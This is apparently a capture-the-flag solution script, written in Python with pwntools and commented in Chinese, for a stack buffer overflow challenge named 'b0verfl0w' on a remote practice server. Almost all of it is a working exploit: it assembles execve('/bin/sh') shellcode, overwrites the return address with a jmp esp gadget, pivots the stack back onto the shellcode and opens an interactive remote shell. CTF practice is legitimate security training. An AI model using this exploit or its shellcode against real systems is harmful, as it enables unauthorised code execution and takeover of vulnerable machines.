from pwn import *

'''
fgets只能输入50个字节，padding就0x20个字节了，再加上fake ebp的4个字节和ret的4个字节，剩余10字节，无法写入shellcode，
那么我们可以考虑在栈的初始位置布置一段shellcode，然后让程序跳转到栈的起始处执行shellcode
'''
r = remote('node5.buuoj.cn', 26908)
# r = process('./b0verfl0w')
context.arch = 'i386'
jmp_esp = 0x8048504
shellcode = asm('''
                xor eax,eax
                xor ecx,ecx
                push ecx
                push 0x68732f2f
                push 0x6e69622f
                mov ebx,esp
                xor edx,edx
                mov eax,0xb
                int 0x80
                ''')
# 伪造栈如下: -0x28是因为前面shellcode加上padding和ebp一共是0x24，外加一个jmp_esp的字节长度4，一共是0x28
# shellcode -> padding -> ebp -> jmp_esp -> asm(sub esp,0x28;jmp esp)
payload = shellcode + b'A' * (0x24 - len(shellcode)) + p32(jmp_esp) + asm('sub esp,0x28;jmp esp')
r.sendlineafter(b'name?', payload)
r.interactive()
